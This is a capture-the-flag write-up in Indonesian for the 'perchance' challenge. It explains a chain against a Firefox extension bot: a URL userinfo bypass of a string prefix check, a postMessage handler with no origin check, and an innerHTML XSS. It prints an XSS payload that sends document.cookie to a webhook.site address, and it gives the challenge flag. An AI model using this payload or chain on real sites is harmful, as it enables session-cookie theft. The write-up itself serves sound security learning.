# Judul Challenge

perchance

## Ringkasan

Challenge ini memakai bot Firefox dengan extension WebExtension. Endpoint hanya memeriksa prefix URL secara string, sedangkan browser mem-parsing URL dengan aturan userinfo. Extension juga menerima `postMessage` tanpa validasi origin dan menyimpan origin hasil parsing ke konfigurasi.

Chain exploit:

1. Host halaman HTML dan kirim URL berbentuk `https://host-kita/https://doc.rust-lang.org/` ke halaman options extension melalui iframe.
2. Gunakan iframe probe pada origin host-kita. Event `webNavigation` memenuhi pengecekan extension sehingga `cs.js` diinjeksi ke tab.
3. Hook nonce yang dibuat `cs.js` agar nilai tersimpan sebagai `previous` berupa HTML XSS. Kembalikan konfigurasi ke `doc.rust-lang.org`, lalu navigasi ke `/stable/std/` untuk menjalankan XSS pada origin yang memiliki cookie flag.

## Target dan File

- Target: `POST /perchance`
- Source utama: `src/index.ts`, `src/browser.ts`
- Extension: `extension/background.js`, `extension/assets/options.js`, `extension/assets/cs.js`
- Solver: [solve.py](solve.py)

## Analisis Awal

Server menerima URL jika `url.startsWith('https://doc.rust-lang.org')`. URL dengan userinfo seperti berikut lolos validasi:

```text
https://doc.rust-lang.org@attacker.example/https://doc.rust-lang.org/
```

Namun origin aktual browser adalah `https://attacker.example`, dan path tetap mengandung string `https://doc.rust-lang.org/`.

## Source Code Review

`options.js` menerima pesan string yang diawali `http` dari semua origin. Validasi hanya memastikan URL mengandung `https://doc.rust-lang.org/`, lalu menyimpan `u.origin`. Dengan URL host attacker yang mengandung string docs di path, attacker dapat mengubah `activateOn` menjadi origin miliknya.

`background.js` kemudian memeriksa `startsWith(activateOn)` dan `includes('https://doc.rust-lang.org/')`. Tidak ada pemeriksaan `frameId`, sehingga navigasi iframe probe dapat memicu injection ke tab.

`cs.js` memasukkan nilai `previous` menggunakan `innerHTML`. Nilai tersebut dapat dikendalikan lewat fungsi nonce yang dipanggil dari page context.

## Vulnerability

Terdapat kombinasi tiga bug:

- validasi URL server berbasis prefix string dan URL userinfo confusion;
- `postMessage` pada options page tanpa validasi `event.origin`;
- HTML injection dari `previous` melalui `innerHTML`, dengan content-script/page-context bridge yang dapat di-hook.

## Eksploitasi

Solver meng-upload HTML ke BugSmash Drop. HTML tersebut:

- memuat `moz-extension://.../options.html` dalam iframe;
- mengirim konfigurasi attacker melalui `postMessage`;
- membuat iframe probe pada URL bersih `/<clean>/https://doc.rust-lang.org/`;
- menangkap nonce dengan `MutationObserver` dan mengganti getter globalnya;
- mengirim konfigurasi kembali ke docs lalu mengarahkan tab ke `https://doc.rust-lang.org/stable/std/`;
- mengirim `document.cookie` ke webhook.

## Solve Script

Solver lengkap tersedia di [solve.py](solve.py). Payload XSS final yang digunakan:

```html
<img src=x onerror='navigator.sendBeacon("https://webhook.site/TOKEN",document.cookie)'>
```

## Cara Menjalankan

Ubah `TARGET` di `solve.py` ke instance challenge yang masih aktif, lalu jalankan:

```bash
python3 -m py_compile solve.py
python3 -u solve.py
```

Solver membutuhkan akses internet untuk BugSmash Drop dan webhook.site.

## Flag

```text
NNS{PerHap5_Y0u_MigH7_P05siB1Y_enj0y_ctF5_perCh4NCe}
```

## Catatan Stabilitas

Bot hanya mengizinkan satu browser aktif pada satu waktu. Jangan mengirim trigger kedua sebelum request pertama selesai. Payload final tidak memakai resource jaringan yang sengaja menggantung; trigger iframe probe dipakai agar request browser selesai normal.
